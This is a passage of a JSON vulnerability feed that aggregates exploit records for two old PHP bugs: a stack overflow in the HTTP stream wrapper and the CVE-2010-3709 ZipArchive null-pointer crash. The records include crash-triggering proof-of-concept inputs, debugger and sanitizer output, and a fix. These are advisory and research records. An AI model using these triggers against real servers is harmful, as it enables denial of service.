f2 00 f4 f4 f4 f2 f2 f2 f2 00 f4\r\n  0x37f80700: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00\r\n=>0x37f80710: f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00\r\n  0x37f80720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2\r\n  0x37f80730: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f80740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f80750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f80760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:     fa\r\n  Heap righ redzone:     fb\r\n  Freed Heap region:     fd\r\n  Stack left redzone:    f1\r\n  Stack mid redzone:     f2\r\n  Stack right redzone:   f3\r\n  Stack partial redzone: f4\r\n  Stack after return:    f5\r\n  Stack use after scope: f8\r\n  Global redzone:        f9\r\n  Global init order:     f6\r\n  Poisoned by user:      f7\r\n  ASan internal:         fe\r\n==26249== ABORTING\r\nAborted",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:44846"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category dos / poc",
            "modified": "2018-06-06T00:00:00",
            "published": "2018-06-06T00:00:00",
            "id": "1337DAY-ID-30541",
            "href": "https://0day.today/exploit/description/30541",
            "title": "PHP 7.2.2 - php_stream_url_wrap_http_ex Buffer Overflow Exploit",
            "type": "zdt",
            "sourceData": "Description:\r\n------------\r\nThe latest PHP distributions contain a memory corruption bug while parsing malformed HTTP response packets. Vulnerable code at:\r\n \r\nphp_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\r\n \r\n            if (tmp_line[tmp_line_len - 1] == '\\n') {\r\n                --tmp_line_len;\r\n                if (tmp_line[tmp_line_len - 1] == '\\r') {\r\n                    --tmp_line_len;\r\n                }\r\n}\r\n \r\nIf the proceeding buffer contains '\\r' as either controlled content or junk on stack, under a realistic setting (non-ASAN), tmp_line_len could go do -1, resulting in an extra large string being copied subsequently. Under ASAN a segfault can be observed.\r\n \r\n$ bin/php --version\r\nPHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )\r\nCopyright (c) 1997-2018 The PHP Group\r\nZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies\r\n \r\n \r\nTest script:\r\n---------------\r\n$ xxd -g 1 poc\r\n0000000: 30 30 30 30 30 30 30 30 30 31 30 30 0a 0a        000000000100..\r\n \r\n$ nc -vvlp 8080 < poc\r\nListening on [0.0.0.0] (family 0, port 8080)\r\nConnection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)\r\nGET / HTTP/1.0\r\nHost: localhost:8080\r\nConnection: close\r\n \r\n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'\r\n \r\nExpected result:\r\n----------------\r\nNO CRASH\r\n \r\nActual result:\r\n--------------\r\n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'\r\n=================================================================\r\n==26249== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xbfc038ef at pc 0x8aa393b bp 0xbfc02eb8 sp 0xbfc02eac\r\nREAD of size 1 at 0xbfc038ef thread T0\r\n    #0 0x8aa393a in php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\r\n    #1 0x8aa61fb in php_stream_url_wrap_http /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:979\r\n    #2 0x8b8b115 in _php_stream_open_wrapper_ex /home/weilei/php-7.2.2/main/streams/streams.c:2027\r\n    #3 0x8918dc0 in zif_file_get_contents /home/weilei/php-7.2.2/ext/standard/file.c:550\r\n    #4 0x867993a in phar_file_get_contents /home/weilei/php-7.2.2/ext/phar/func_interceptors.c:224\r\n    #5 0x91ee267 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:573\r\n    #6 0x91ee267 in execute_ex /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:59731\r\n    #7 0x923c13c in zend_execute /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:63760\r\n    #8 0x8cba975 in zend_eval_stringl /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1082\r\n    #9 0x8cbaf66 in zend_eval_stringl_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1123\r\n    #10 0x8cbb06b in zend_eval_string_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1134\r\n    #11 0x9244455 in do_cli /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1042\r\n    #12 0x9246b37 in main /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1404\r\n    #13 0xb5e8ca82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)\r\n    #14 0x80656d0 in _start (/home/weilei/php7_asan/bin/php+0x80656d0)\r\nAddress 0xbfc038ef is located at offset 607 in frame <php_stream_url_wrap_http_ex> of T0's stack:\r\n  This frame has 13 object(s):\r\n    [32, 36) 'transport_string'\r\n    [96, 100) 'errstr'\r\n    [160, 164) 'http_header_line_length'\r\n    [224, 232) 'timeout'\r\n    [288, 296) 'req_buf'\r\n    [352, 360) 'tmpstr'\r\n    [416, 432) 'ssl_proxy_peer_name'\r\n    [480, 496) 'http_header'\r\n    [544, 576) 'buf'\r\n    [608, 736) 'tmp_line'\r\n    [768, 1792) 'location'\r\n    [1824, 2848) 'new_path'\r\n    [2880, 3904) 'loc_path'\r\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext\r\n      (longjmp and C++ exceptions *are* supported)\r\nSUMMARY: AddressSanitizer: stack-buffer-overflow /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723 php_stream_url_wrap_http_ex\r\nShadow bytes around the buggy address:\r\n  0x37f806c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f806d0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4\r\n  0x37f806e0: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4\r\n  0x37f806f0: f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f2 f2 f2 f2 00 f4\r\n  0x37f80700: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00\r\n=>0x37f80710: f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00\r\n  0x37f80720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2\r\n  0x37f80730: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f80740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f80750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f80760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:     fa\r\n  Heap righ redzone:     fb\r\n  Freed Heap region:     fd\r\n  Stack left redzone:    f1\r\n  Stack mid redzone:     f2\r\n  Stack right redzone:   f3\r\n  Stack partial redzone: f4\r\n  Stack after return:    f5\r\n  Stack use after scope: f8\r\n  Global redzone:        f9\r\n  Global init order:     f6\r\n  Poisoned by user:      f7\r\n  ASan internal:         fe\r\n==26249== ABORTING\r\nAborted\n\n#  0day.today [2018-06-06]  #",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-30541"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2018-06-06T00:00:00",
            "published": "2018-06-06T00:00:00",
            "id": "PACKETSTORM:148068",
            "href": "https://packetstormsecurity.com/files/148068/PHP-7.22-php_stream_url_wrap_http_ex-Buffer-Overflow.html",
            "title": "PHP 7.22 php_stream_url_wrap_http_ex Buffer Overflow",
            "type": "packetstorm",
            "sourceData": "`Description:  \n------------  \nThe latest PHP distributions contain a memory corruption bug while parsing malformed HTTP response packets. Vulnerable code at:  \n  \nphp_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723  \n  \nif (tmp_line[tmp_line_len - 1] == '\\n') {  \n--tmp_line_len;  \nif (tmp_line[tmp_line_len - 1] == '\\r') {  \n--tmp_line_len;  \n}  \n}  \n  \nIf the proceeding buffer contains '\\r' as either controlled content or junk on stack, under a realistic setting (non-ASAN), tmp_line_len could go do -1, resulting in an extra large string being copied subsequently. Under ASAN a segfault can be observed.  \n  \n$ bin/php --version  \nPHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )  \nCopyright (c) 1997-2018 The PHP Group  \nZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies  \n  \n  \nTest script:  \n---------------  \n$ xxd -g 1 poc  \n0000000: 30 30 30 30 30 30 30 30 30 31 30 30 0a 0a 000000000100..  \n  \n$ nc -vvlp 8080 < poc  \nListening on [0.0.0.0] (family 0, port 8080)  \nConnection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)  \nGET / HTTP/1.0  \nHost: localhost:8080  \nConnection: close  \n  \n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'  \n  \nExpected result:  \n----------------  \nNO CRASH  \n  \nActual result:  \n--------------  \n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'  \n=================================================================  \n==26249== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xbfc038ef at pc 0x8aa393b bp 0xbfc02eb8 sp 0xbfc02eac  \nREAD of size 1 at 0xbfc038ef thread T0  \n#0 0x8aa393a in php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723  \n#1 0x8aa61fb in php_stream_url_wrap_http /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:979  \n#2 0x8b8b115 in _php_stream_open_wrapper_ex /home/weilei/php-7.2.2/main/streams/streams.c:2027  \n#3 0x8918dc0 in zif_file_get_contents /home/weilei/php-7.2.2/ext/standard/file.c:550  \n#4 0x867993a in phar_file_get_contents /home/weilei/php-7.2.2/ext/phar/func_interceptors.c:224  \n#5 0x91ee267 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:573  \n#6 0x91ee267 in execute_ex /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:59731  \n#7 0x923c13c in zend_execute /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:63760  \n#8 0x8cba975 in zend_eval_stringl /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1082  \n#9 0x8cbaf66 in zend_eval_stringl_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1123  \n#10 0x8cbb06b in zend_eval_string_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1134  \n#11 0x9244455 in do_cli /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1042  \n#12 0x9246b37 in main /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1404  \n#13 0xb5e8ca82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)  \n#14 0x80656d0 in _start (/home/weilei/php7_asan/bin/php+0x80656d0)  \nAddress 0xbfc038ef is located at offset 607 in frame <php_stream_url_wrap_http_ex> of T0's stack:  \nThis frame has 13 object(s):  \n[32, 36) 'transport_string'  \n[96, 100) 'errstr'  \n[160, 164) 'http_header_line_length'  \n[224, 232) 'timeout'  \n[288, 296) 'req_buf'  \n[352, 360) 'tmpstr'  \n[416, 432) 'ssl_proxy_peer_name'  \n[480, 496) 'http_header'  \n[544, 576) 'buf'  \n[608, 736) 'tmp_line'  \n[768, 1792) 'location'  \n[1824, 2848) 'new_path'  \n[2880, 3904) 'loc_path'  \nHINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext  \n(longjmp and C++ exceptions *are* supported)  \nSUMMARY: AddressSanitizer: stack-buffer-overflow /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723 php_stream_url_wrap_http_ex  \nShadow bytes around the buggy address:  \n0x37f806c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  \n0x37f806d0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4  \n0x37f806e0: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4  \n0x37f806f0: f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f2 f2 f2 f2 00 f4  \n0x37f80700: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00  \n=>0x37f80710: f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00  \n0x37f80720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2  \n0x37f80730: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00  \n0x37f80740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  \n0x37f80750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  \n0x37f80760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  \nShadow byte legend (one shadow byte represents 8 application bytes):  \nAddressable: 00  \nPartially addressable: 01 02 03 04 05 06 07   \nHeap left redzone: fa  \nHeap righ redzone: fb  \nFreed Heap region: fd  \nStack left redzone: f1  \nStack mid redzone: f2  \nStack right redzone: f3  \nStack partial redzone: f4  \nStack after return: f5  \nStack use after scope: f8  \nGlobal redzone: f9  \nGlobal init order: f6  \nPoisoned by user: f7  \nASan internal: fe  \n==26249== ABORTING  \nAborted  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:148068"
        }
    ],
    "CVE-2010-3709": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 44718\r\nCVE ID: CVE-2010-3709\r\n\r\nPHP\u662f\u5e7f\u6cdb\u4f7f\u7528\u7684\u901a\u7528\u76ee\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7279\u522b\u9002\u5408\u4e8eWeb\u5f00\u53d1\uff0c\u53ef\u5d4c\u5165\u5230HTML\u4e2d\u3002\r\n\r\nZipArchive\u5e93\u5141\u8bb8\u900f\u660e\u7684\u8bfb\u5199ZIP\u538b\u7f29\u6863\u6848\u53ca\u5176\u4e4b\u4e2d\u7684\u6587\u4ef6\u3002\u5bf9\u4e8ePHP\u4e2d\u6240\u4f7f\u7528\u7684ZipArchive::getArchiveComment\u51fd\u6570\uff1a\r\n\r\n- ---\r\n1945     static ZIPARCHIVE_METHOD(getArchiveComment)\r\n1946     {\r\n1947     struct zip *intern;\r\n1948     zval *this = getThis();\r\n1949     long flags = 0;\r\n1950     const char * comment;\r\n1951     int comment_len = 0;\r\n1952     \r\n1953     if (!this) {\r\n1954     RETURN_FALSE;\r\n1955     }\r\n1956     \r\n1957     ZIP_FROM_OBJECT(intern, this);\r\n1958     \r\n1959     if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;|l&quot;, &amp;flags)\r\n== FAILURE) {\r\n1960     return;\r\n1961     }\r\n1962     \r\n1963     comment = zip_get_archive_comment(intern, &amp;comment_len,\r\n(int)flags); &lt;==== RETURN NULL AND -1\r\n1964     RETURN_STRINGL((char *)comment, (long)comment_len, 1); &lt;===== NULL\r\nPOINTER DEFERENCE HERE\r\n1965     }\r\n- ---\r\n\r\n\u8fd9\u79cd\u65b9\u5f0f\u4ecezip_get_archive_comment()\u51fd\u6570\u8fd4\u56de\u5b57\u7b26\u4e32\u3002\u800c\u5728\u8fd9\u4e2a\u51fd\u6570\u4e2d\uff1a\r\n\r\n- ---\r\n40     ZIP_EXTERN(const char *)\r\n41     zip_get_archive_comment(struct zip *za, int *lenp, int flags)\r\n42     {\r\n43     if ((flags &amp; ZIP_FL_UNCHANGED)\r\n44     || (za-&gt;ch_comment_len == -1)) {\r\n45     if (za-&gt;cdir) {\r\n46     if (lenp != NULL)\r\n47     *lenp = za-&gt;cdir-&gt;comment_len;\r\n48     return za-&gt;cdir-&gt;comment;\r\n49     }\r\n50     else {\r\n51     if (lenp != NULL)\r\n52     *lenp = -1; &lt;===================== -1\r\n53     return NULL; &lt;==================== NULL\r\n54     }\r\n55     }\r\n56     \r\n57     if (lenp != NULL)\r\n58     *lenp = za-&gt;ch_comment_len;\r\n59     return za-&gt;ch_comment;\r\n60     }\r\n- ---\r\n\r\n52\u548c53\u884c\u5e94\u8fd4\u56de\u7a7a\u6307\u9488\u548c(int)-1\u3002\u5728\u7ed3\u679c\u4e2d\u4f1a\u4ee5\u4ee5\u4e0b\u65b9\u5f0f\u6267\u884cRETURN_STRINGL()\uff1a\r\n\r\nRETURN_STRINGL(NULL, -1, 1);\r\n\r\nmemcpy(3)\u4e2d\u4f1a\u51fa\u73b0\u5d29\u6e83\u3002\n\nPHP PHP 5.3.3\r\nPHP PHP 5.2.14\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/php_zip.c?view=log\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_2/ext/zip/php_zip.c?view=log",
            "modified": "2010-11-10T00:00:00",
            "published": "2010-11-10T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20240",
            "id": "SSV:20240",
            "type": "seebug",
            "title": "PHP ZipArchive::getArchiveComment()\u51fd\u6570\u7a7a\u6307\u9488\u5f15\u7528\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "\n                                                cx@cx64:/www$ touch empty.zip\r\ncx@cx64:/www$ php -r '$zip= new\r\nZipArchive;$zip-&gt;open(&quot;./empty.zip&quot;);$zip-&gt;getArchiveComment();'\r\nSegmentation fault\r\n\r\nDebug:\r\ncx@cx64:/www$ gdb -q php\r\nReading symbols from /usr/bin/php...(no debugging symbols found)...done.\r\n(gdb) r -r '$zip= new\r\nZipArchive;$zip-&gt;open(&quot;./empty.zip&quot;);$zip-&gt;getArchiveComment();'\r\nStarting program: /usr/bin/php -r '$zip= new\r\nZipArchive;$zip-&gt;open(&quot;./empty.zip&quot;);$zip-&gt;getArchiveComment();'\r\n[Thread debugging using libthread_db enabled]\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00007ffff530edbb in memcpy () from /lib/libc.so.6\r\n(gdb) bt\r\n#0  0x00007ffff530edbb in memcpy () from /lib/libc.so.6\r\n#1  0x0000000000679fa8 in _estrndup ()\r\n#2  0x00000000006371e5 in ?? ()\r\n#3  0x00000000006e793a in ?? ()\r\n#4  0x00000000006bec20 in execute ()\r\n#5  0x000000000068b44a in zend_eval_stringl ()\r\n#6  0x000000000068b5c9 in zend_eval_stringl_ex ()\r\n#7  0x000000000072743e in ?? ()\r\n#8  0x00007ffff52a6c4d in __libc_start_main () from /lib/libc.so.6\r\n#9  0x000000000042c6a9 in _start ()\r\n(gdb) x/i $rip\r\n=&gt; 0x7ffff530edbb &lt;memcpy+347&gt;: rep movsq %ds:(%rsi),%es:(%rdi)\r\n(gdb) x/x $rsi\r\n0x0:    Cannot access memory at address 0x0\r\n(gdb) x/x $rbp\r\n0xffffffff:     Cannot access memory at address 0xffffffff\r\n\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20240"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2010-11-08T00:00:00",
            "published": "2010-11-08T00:00:00",
            "href": "https://packetstormsecurity.com/files/95574/PHP-5.3.3-5.2.14-ZipArchive-getArchiveComment-NULL-Pointer-Dereference.html",
            "id": "PACKETSTORM:95574",
            "type": "packetstorm",
            "title": "PHP 5.3.3 / 5.2.14 ZipArchive::getArchiveComment NULL Pointer Dereference",
            "sourceData": "`-----BEGIN PGP SIGNED MESSAGE-----  \nHash: SHA1  \n  \n[PHP 5.3.3/5.2.14 ZipArchive::getArchiveComment NULL Pointer Deference]  \n  \nAuthor: Maksymilian Arciemowicz  \nhttp://securityreason.com/  \nhttp://cxib.net/  \nDate:  \n- - Dis.: 14.09.2010  \n- - Pub.: 05.11.2010  \n  \nCVE: CVE-2010-3709  \nCWE: CWE-476  \nStatus: Fixed in CVS  \n  \nAffected Software:  \n- - PHP 5.3.3  \n- - PHP 5.2.14  \n  \nOriginal URL:  \nhttp://securityreason.com/achievement_securityalert/90  \n  \n  \n- --- 0.Description ---  \nZipArchive enables you to transparently read or write ZIP compressed  \narchives and the files inside them.  \n  \nZipArchive::getArchiveComment ? Returns the Zip archive comment  \n  \nstring ZipArchive::getArchiveComment ( void )  \n  \n  \n- --- 1. PHP 5.3.3/5.2.14 ZipArchive::getArchiveComment (CWE-476) ---  \nAs we can see in  \n  \nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/php_zip.c?revision=303622&view=markup  \n  \n- ---  \n1945 static ZIPARCHIVE_METHOD(getArchiveComment)  \n1946 {  \n1947 struct zip *intern;  \n1948 zval *this = getThis();  \n1949 long flags = 0;  \n1950 const char * comment;  \n1951 int comment_len = 0;  \n1952   \n1953 if (!this) {  \n1954 RETURN_FALSE;  \n1955 }  \n1956   \n1957 ZIP_FROM_OBJECT(intern, this);  \n1958   \n1959 if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"|l\", &flags)  \n== FAILURE) {  \n1960 return;  \n1961 }  \n1962   \n1963 comment = zip_get_archive_comment(intern, &comment_len,  \n(int)flags); <==== RETURN NULL AND -1  \n1964 RETURN_STRINGL((char *)comment, (long)comment_len, 1); <===== NULL  \nPOINTER DEFERENCE HERE  \n1965 }  \n- ---  \n  \nthis method return string from zip_get_archive_comment() function. Now  \nwe need see this function,  \n  \nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/lib/zip_get_archive_comment.c?revision=284361&view=markup  \n  \n- ---  \n40 ZIP_EXTERN(const char *)  \n41 zip_get_archive_comment(struct zip *za, int *lenp, int flags)  \n42 {  \n43 if ((flags & ZIP_FL_UNCHANGED)  \n44 || (za->ch_comment_len == -1)) {  \n45 if (za->cdir) {  \n46 if (lenp != NULL)  \n47 *lenp = za->cdir->comment_len;  \n48 return za->cdir->comment;  \n49 }  \n50 else {  \n51 if (lenp != NULL)  \n52 *lenp = -1; <===================== -1  \n53 return NULL; <==================== NULL  \n54 }  \n55 }  \n56   \n57 if (lenp != NULL)  \n58 *lenp = za->ch_comment_len;  \n59 return za->ch_comment;  \n60 }  \n- ---  \n  \n  \nline 52 and 53 should return NULL pointer and (int)-1. In result  \nRETURN_STRINGL() will be executed with:  \n  \nRETURN_STRINGL(NULL, -1, 1);  \n  \nand crash in memcpy(3).  \n  \n  \n- --- 2. PoC ---  \n  \ncx@cx64:/www$ touch empty.zip  \ncx@cx64:/www$ php -r '$zip= new  \nZipArchive;$zip->open(\"./empty.zip\");$zip->getArchiveComment();'  \nSegmentation fault  \n  \nDebug:  \ncx@cx64:/www$ gdb -q php  \nReading symbols from /usr/bin/php...(no debugging symbols found)...done.  \n(gdb) r -r '$zip= new  \nZipArchive;$zip->open(\"./empty.zip\");$zip->getArchiveComment();'  \nStarting program: /usr/bin/php -r '$zip= new  \nZipArchive;$zip->open(\"./empty.zip\");$zip->getArchiveComment();'  \n[Thread debugging using libthread_db enabled]  \n  \nProgram received signal SIGSEGV, Segmentation fault.  \n0x00007ffff530edbb in memcpy () from /lib/libc.so.6  \n(gdb) bt  \n#0 0x00007ffff530edbb in memcpy () from /lib/libc.so.6  \n#1 0x0000000000679fa8 in _estrndup ()  \n#2 0x00000000006371e5 in ?? ()  \n#3 0x00000000006e793a in ?? ()  \n#4 0x00000000006bec20 in execute ()  \n#5 0x000000000068b44a in zend_eval_stringl ()  \n#6 0x000000000068b5c9 in zend_eval_stringl_ex ()  \n#7 0x000000000072743e in ?? ()  \n#8 0x00007ffff52a6c4d in __libc_start_main () from /lib/libc.so.6  \n#9 0x000000000042c6a9 in _start ()  \n(gdb) x/i $rip  \n=> 0x7ffff530edbb <memcpy+347>: rep movsq %ds:(%rsi),%es:(%rdi)  \n(gdb) x/x $rsi  \n0x0: Cannot access memory at address 0x0  \n(gdb) x/x $rbp  \n0xffffffff: Cannot access memory at address 0xffffffff  \n  \n  \n- --- 3. Fix ---  \nFix:  \nReplace  \n1963 comment = zip_get_archive_comment(intern, &comment_len, (int)flags);  \n1964 RETURN_STRINGL((char *)comment, (long)comment_len, 1);  \n  \nto  \n  \n1963 comment = zip_get_archive_comment(intern, &comment_len, (int)flags);  \n1964 if(comment==NULL) RETURN_FALSE;  \n1965 RETURN_STRINGL((char *)comment, (long)comment_len, 1);  \n  \nPHP 5.3:  \nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/php_zip.c?view=log  \n  \nPHP 5.2:  \nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_2/ext/zip/php_zip.c?view=log  \n  \nMDVSA-2010:218  \n  \n  \n- --- 4. Greets ---  \nSpecial thanks for Pierre Joye  \n  \nsp3x, Infospec, Adam Zabrocki 'pi3'  \n  \n  \n- --- 5. Contact ---  \nAuthor: SecurityReason.com [ Maksymilian Arciemowicz ]  \n  \nEmail:  \n- - cxib {a\\./t] securityreason [d=t} com  \n  \nGPG:  \n- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg  \n  \nhttp://securityreason.com/  \nhttp://cxib.net/  \n  \n- --   \nBest Regards  \npub 4096R/D6E5B530 2010-09-19  \nuid Maksymilian Arciemowicz (cx) <max@cxib.net>  \nsub 4096R/58BA663C 2010-09-19  \n-----BEGIN PGP SIGNATURE-----  \n  \niQIcBAEBAgAGBQJM1GvbAAoJEIO8+dzW5bUwSNAQAK6zlkav7055LDi253vq4Urs  \nYIXd5u5FIrttRCMMJdANhxqFwYbMk5fUwICsw7i4qsirNg9Cdam2MI38GCi4Um2Z  \nso8fBo+NndTTqStM00gmJva/8HlhLw9LyXh05Ii7FcgK3DRwvAYa/1BFvAi7yBhX  \nEPOqRWaaeiDvehtjn/SC8enbesHE2hEUDiuNhMwZEDmdbv+EfpOMt/lBcwwdKZcE  \nQwXS7ElHyJ0geDB9ynnaAgmZvbnbA7aj0BpCIf+9C+Qu0kdSf4F/t0nDG2BfvvyF  \nwB5hT5wPYYIexsqnGPBHy48t38JTZ10mJrLVSnK5My5ODHrU1QqZau/8zMnZU7Uw  \nOoA5QawzW4CQX5tUfG0cD+Qd7DA2WX/ui7akw5nSHNL0AIru/IMmdZwXHuqJke6R  \nAfQlY3VznE0V7/O9F+y2gkbkAMTdVjddU6N6Z72hJSrzRCxIgqcSFIXOtQIXz6fl  \nH4ymSLL0VydYrG6kiw4b6UgAXRhWFEsjrSmpYS61MnWTsx+B55ERjIXoQpiBYTbl  \nRRrDvXDCa9r/xpAX/yC2FVz7ECfOePI+gx/FW2dSBBEKe340xsmE/H90iLUWhDhX  \ncsCYgZWvIe8mAZ3zT3c0ONAoRPWjnLo+QhMZtyZk4vc294C9spdR8uAlGxIVfQf5  \n+RibkqlDnn1yRveXjRpO  \n=REiM  \n-----END PGP SIGNATURE-----  \n`\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:95574"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.3/5.2.14 ZipArchive::getArchiveComment NULL Pointer Deference. CVE-2010-3709. Dos exploit for php platform",
            "modified": "2010-11-05T00:00:00",
            "published": "2010-11-05T00:00:00",
            "id": "EDB-ID:15431",
            "href": "https://www.exploit-db.com/exploits/15431/",
            "type": "exploitdb",
            "title": "PHP 5.3.3/5.2.14 ZipArchive::getArchiveComment NULL Pointer Deference",
